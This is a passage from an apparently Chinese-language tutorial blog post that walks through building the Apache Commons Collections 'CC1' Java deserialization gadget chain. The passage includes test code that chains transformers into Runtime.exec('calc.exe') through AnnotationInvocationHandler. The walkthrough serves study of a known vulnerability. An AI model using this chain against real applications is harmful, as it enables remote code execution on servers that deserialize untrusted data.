class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        value = parent.checkSetValue(value);<br>        <span class="hljs-keyword">return</span> entry.setValue(value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>继承关系如下</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">MapEntry &lt;<span class="hljs-operator">=</span> AbstractMapEntryDecorator<br></code></pre></td></tr></table></figure><p><code>MapEntry</code>类的父类<code>AbstractMapEntryDecorator</code>是抽象类，抽象类不能被实例化，但是可以有构造方法。这里在<code>MapEntry</code>类中构造方法，<code>super(entry)</code>实际上是<code>AbstractMapEntryDecorator</code>的构造方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Map.Entry entry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">AbstractMapEntryDecorator</span><span class="hljs-params">(Map.Entry entry)</span> &#123;<br>       <span class="hljs-keyword">if</span> (entry == <span class="hljs-literal">null</span>) &#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Map Entry must not be null&quot;</span>);<br>       &#125;<br>       <span class="hljs-built_in">this</span>.entry = entry;<br>   &#125;<br></code></pre></td></tr></table></figure><h4 id="梳理一下"><a href="#梳理一下" class="headerlink" title="梳理一下"></a>梳理一下</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">MapEntry.class == AbstractMapEntryDecorator.entry == Map.Entry.<span class="hljs-keyword">class</span><br>    <span class="hljs-title class_">MapEntry</span>.setValue(Object value)<br>        TransformedMap.decorate(Map map, Transformer keyTransformer, Transformer valueTransformer)<br>        TranformedMap.checkSetValue(Object value)<br>                invokerTransformer.transform(Object input);<br><br>valueTransformer == invokerTransformer<br>value == Runtime.getRuntime()<br></code></pre></td></tr></table></figure><p>三个Object是连续的传递，至于MapEntry如何得到呢？<code>Map</code> 通过 <code>entrySet()</code> 方法可以获取 <code>Map.Entry</code></p><h4 id="升级："><a href="#升级：" class="headerlink" title="升级："></a>升级：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// MapEntry.setValue() ==&gt;  TransformedMap.checkSetValue() ==&gt;  InvokerTransformer.transform()</span><br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        <span class="hljs-comment">// valueTransformer == invokerTransformer</span><br>        Map&lt;Object,Object&gt; decorated = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);<br><br><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;Object, Object&gt; entry : decorated.entrySet()) &#123;<br><span class="hljs-comment">//            System.out.println(entry);</span><br>            entry.setValue(Runtime.getRuntime());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>弹出计算机为成功</p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p>继续老办法，<code>alt + F7</code>查看用法。</p><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>这个类刚好调用了<code>setValue()</code>方法，而且还刚好在<code>readObject()</code>方法中调用<code>setValue()</code>。在该类被反序列化的时候则会调用<code>readObject()</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        annotationType = AnnotationType.getInstance(type);<br>    &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>        <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>    &#125;<br><br>    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>    <span class="hljs-comment">// If there are annotation members without values, that</span><br>    <span class="hljs-comment">// situation is handled by the invoke method.</span><br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>        Class&lt;?&gt; memberType = memberTypes.get(name);<br>        <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>            <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                  value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                memberValue.setValue(<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                        value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                            annotationType.members().get(name)));<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以看到通过<code>entrySet()</code>来获得<code>Map.Entry</code></p><p>在到达<code>setValue()</code>前需要绕过两层<code>if</code>判断。</p><p>type，memberValues是通过构造函数可传递的参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;<br>    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();<br>    <span class="hljs-keyword">if</span> (!type.isAnnotation() ||<br>        superInterfaces.length != <span class="hljs-number">1</span> ||<br>        superInterfaces[<span class="hljs-number">0</span>] != java.lang.annotation.Annotation.class)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationFormatError</span>(<span class="hljs-string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);<br>    <span class="hljs-built_in">this</span>.type = type;<br>    <span class="hljs-built_in">this</span>.memberValues = memberValues;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Class&lt;? extends Annotation&gt; type</code>是什么呢，chatgpt</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">Class</span>&lt;? extends Annotation&gt; 可以表示任意注解的 <span class="hljs-keyword">Class</span> 对象<br><br><span class="hljs-keyword">Class</span>&lt;? extends Annotation&gt; annotationClass = <span class="hljs-keyword">Override</span>.<span class="hljs-keyword">class</span>;<br><span class="hljs-keyword">Class</span>&lt;? extends Annotation&gt; annotationClass2 = <span class="hljs-keyword">Deprecated</span>.<span class="hljs-keyword">class</span>;<br><br>但它不能是 <span class="hljs-keyword">Class</span>&lt;<span class="hljs-keyword">Object</span>&gt; 或 <span class="hljs-keyword">Class</span>&lt;<span class="hljs-keyword">String</span>&gt;，因为它们不是 Annotation 的子类。<br></code></pre></td></tr></table></figure><p>为了兼容性和稳定性，推荐使用一些java自带的注解。</p><h4 id="if-memberType-null"><a href="#if-memberType-null" class="headerlink" title="if (memberType != null)"></a><code>if (memberType != null)</code></h4><p>我们可以实验一下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        Map&lt;String, Object&gt; decorated = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);<br><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> AnnotationType.getInstance(Target.class);<br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br>        System.out.println(memberTypes);<br><br><span class="hljs-comment">//输出:        &#123;value=class [Ljava.lang.annotation.ElementType;&#125;</span><br></code></pre></td></tr></table></figure><p>绕过第一个if，需要在Map.Entry的key在对应memberTypes中有对应的值。</p><p>当Map.Entry的key为value时，值在memberTypes为class，<code>!= null</code> 为 true，加入下列代码验证一番。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : decorated.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;<br>                System.out.println(<span class="hljs-number">123</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;456&quot;</span>);<br>            &#125;<br>            <br><span class="hljs-comment">// hashMap.put(&quot;key&quot;, &quot;value&quot;) 输出456</span><br><span class="hljs-comment">// hashMap.put(&quot;value&quot;, &quot;value&quot;) 输出123</span><br></code></pre></td></tr></table></figure><h4 id="if-memberType-isInstance-value-value-instanceof-ExceptionProxy"><a href="#if-memberType-isInstance-value-value-instanceof-ExceptionProxy" class="headerlink" title="if (!(memberType.isInstance(value) || value instanceof ExceptionProxy))"></a><code>if (!(memberType.isInstance(value) || value instanceof ExceptionProxy))</code></h4><p>脑袋已经晕了，层层剖析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br><span class="hljs-keyword">if</span> (!(memberType.isInstance(value) || value <span class="hljs-keyword">instanceof</span> ExceptionProxy))<br><br><span class="hljs-comment">//        !(memberType.isInstance(value) || value instanceof ExceptionProxy) == True</span><br><span class="hljs-comment">//            memberType.isInstance(value) || value instanceof ExceptionProxy == false</span><br><span class="hljs-comment">//            memberType.isInstance(value) == false</span><br><span class="hljs-comment">//            value instanceof ExceptionProxy == false</span><br><br><span class="hljs-comment">//      value 不是 memberType 类型的实例，也不是 ExceptionProxy 类型的实例</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">hashMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>)<br></code></pre></td></tr></table></figure><p><code>memberValue</code>是Map.Entry的值，也就是第二个<code>&quot;value&quot;</code>。</p><p>memberType为<code>&#123;value=class [Ljava.lang.annotation.ElementType;&#125;</code>，而<code>&quot;value&quot;</code>是一个String，已不是一个 <code>ExceptionProxy</code>的实例。</p><p>实验一下：将之前那段for循环修改为现在的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : decorated.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;<br>                System.out.println(<span class="hljs-number">123</span>);<br><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br><span class="hljs-comment">//                System.out.println(memberType);</span><br><span class="hljs-comment">//                System.out.println(value);</span><br><span class="hljs-comment">//                System.out.println(value.getClass());</span><br><br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                        value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;yes&quot;</span>);<br>                &#125; <span class="hljs-keyword">else</span><br>                    System.out.println(<span class="hljs-string">&quot;no&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;456&quot;</span>);<br>            &#125;<br>        &#125;<br><br><span class="hljs-comment">// 123</span><br><span class="hljs-comment">// yes</span><br></code></pre></td></tr></table></figure><p>也就是能够执行到 <code>memberValue.setValue()</code>,但是参数并不是我们能控制的。</p><p>有没有参数不重要，返回的值是一样的Transformer？</p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><code>org.apache.commons.collections.functors.ConstantTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br>       <span class="hljs-built_in">super</span>();<br>       iConstant = constantToReturn;<br>   &#125;<br><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>       <span class="hljs-keyword">return</span> iConstant;<br>   &#125;<br></code></pre></td></tr></table></figure><h4 id="梳理一下-1"><a href="#梳理一下-1" class="headerlink" title="梳理一下"></a>梳理一下</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">MapEntry.class == AbstractMapEntryDecorator.entry == Map.Entry.<span class="hljs-keyword">class</span><br>    <span class="hljs-title class_">MapEntry</span>.setValue(Object value)<br>        TransformedMap.decorate(Map map, Transformer keyTransformer, Transformer valueTransformer)<br>        TranformedMap.checkSetValue(Object value)<br>   ConstantTransformer(Runtime.getRuntime())<br>                ConstantTransformer.transform(Object input)<br>                <br><br>valueTransformer == ConstantTransformer<br>value == 不重要<br><br></code></pre></td></tr></table></figure><p>调用<code>transform</code>方法的返回值是实例化时传入的参数<code>constantToReturn</code>，但是最后无法执行到危险函数了</p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p>最后的主角，但是脑袋已经不够用了。</p><p><code>org.apache.commons.collections.functors.ChainedTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br>    <span class="hljs-built_in">super</span>();<br>    iTransformers = transformers;<br>&#125;<br><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>        object = iTransformers[i].transform(object);<br>    &#125;<br>    <span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><p>从第0个开始，调用每一个<code>iTransformers</code>的<code>transform()</code>。</p><p>参数则是上一次<code>transform()</code>处理后的 <code>object</code>。 </p><p>我们需要将 <code>Runtime.getRuntime()</code>作为 <code>invokerTransformer.transform()</code>的参数，这里又回到了最初了，常回家看看，回家看看。所以我们需要将 <code>ConstantTransformer</code>作为第一个</p><p><code>ChainedTransformer.transform()</code>传入什么作为参数都不重要。我们可以看看循环过程：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css">第一次运行：<br>iTransformers<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.transform</span>(<span class="hljs-selector-tag">object</span>);<br>return Runtime<span class="hljs-selector-class">.getRuntime</span>();<br><br>第二次运行:<br>invokerTransformer.<span class="hljs-built_in">transform</span>(Runtime.<span class="hljs-built_in">getRuntime</span>());<br>是不是就可以执行了呢<br></code></pre></td></tr></table></figure><p>似乎一切都说通了。</p><h3 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h3><p><code> AnnotationInvocationHandler</code>是default类型，在同一包内可见。需要用到反射来初始化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2_1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">constantTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime());<br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span><br>            (<span class="hljs-string">&quot;exec&quot;</span>,<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br><br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;constantTransformer, invokerTransformer&#125;);<br><br>    <span class="hljs-comment">// 生成MapEntry</span><br>    HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    hashMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br><br>    <span class="hljs-comment">//  chainedTransformer 代替了最初的 invokerTransformer</span><br>    Map&lt;String, Object&gt; decorated = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>    <span class="hljs-comment">// 实例化AnnotationInvocationHandler</span><br>    Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>    Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, decorated);<br><br>    serializable(o);<br>    unserializable(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h3><p>意外蛊出现了</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.NotSerializableException</span>: java<span class="hljs-selector-class">.lang</span>.Runtime<br></code></pre></td></tr></table></figure><p><code>Runtime</code>没有继承<code>Serializable</code>接口，所以不能直接被反序列化。</p><p>救星：Class可以被反序列化，再次使用反射。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Class</span>&lt;T&gt; <span class="hljs-keyword">implements</span> java.io.Serializable<br></code></pre></td></tr></table></figure><h4 id="chainedTransformer构造"><a href="#chainedTransformer构造" class="headerlink" title="chainedTransformer构造"></a>chainedTransformer构造</h4><p>代码格式是错误的，只是一个解释，不必按照代码解释。</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">Runtime.getRuntime().exec()<br><br><span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class).transform()<br>return  Runtime.class<br><br><span class="hljs-comment">//执行 &quot;getMethod&quot;获取到Runtime.class的&quot;getRuntime()</span><br>invokerTransformer.transform(Runtime.class)<br>return <span class="hljs-keyword">Method</span> <span class="hljs-title function_">Runtime</span>.<span class="hljs-title function_">getRuntime</span><span class="hljs-params">()</span><br>返回的是<span class="hljs-title function_">Method</span>类的对象<br><br>// 使用<span class="hljs-title function_">Invoke</span>调用<span class="hljs-title function_">Runtime</span>.<span class="hljs-title function_">getRuntime</span><span class="hljs-params">()</span><br><span class="hljs-title function_">invokerTransformer</span>.<span class="hljs-title function_">transform</span><span class="hljs-params">(<span class="hljs-keyword">Method</span> Runtime.getRuntime()</span>)<br><span class="hljs-title function_">return</span> <span class="hljs-title function_">Method</span> <span class="hljs-title function_">Runtime</span>.<span class="hljs-title function_">getRuntime</span><span class="hljs-params">()</span>.<span class="hljs-title function_">invoke</span><span class="hljs-params">()</span>;<br><span class="hljs-comment">//执行Runtime.getRuntime().exec()。参数则通过后的返回结果，即：</span><br>currentRuntime<span class="hljs-punctuation">;</span><br><br><span class="hljs-comment">//执行exec()</span><br>invokerTransformer.transform(currentRuntime)<span class="hljs-punctuation">;</span><br>执行currentRuntime.exec()，也就是Runtime.getRuntime().exec()。参数则通过实例化InvokerTransformer时传递。<br></code></pre></td></tr></table></figure><p>需要注意的是实例化InvokerTransformer的时候，参数依次为</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">iMethodName</span>        iParamTypes        iArgs<br>方法名传入方法的参数的类型传入方法的参数<br></code></pre></td></tr></table></figure><h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2_1</span><span 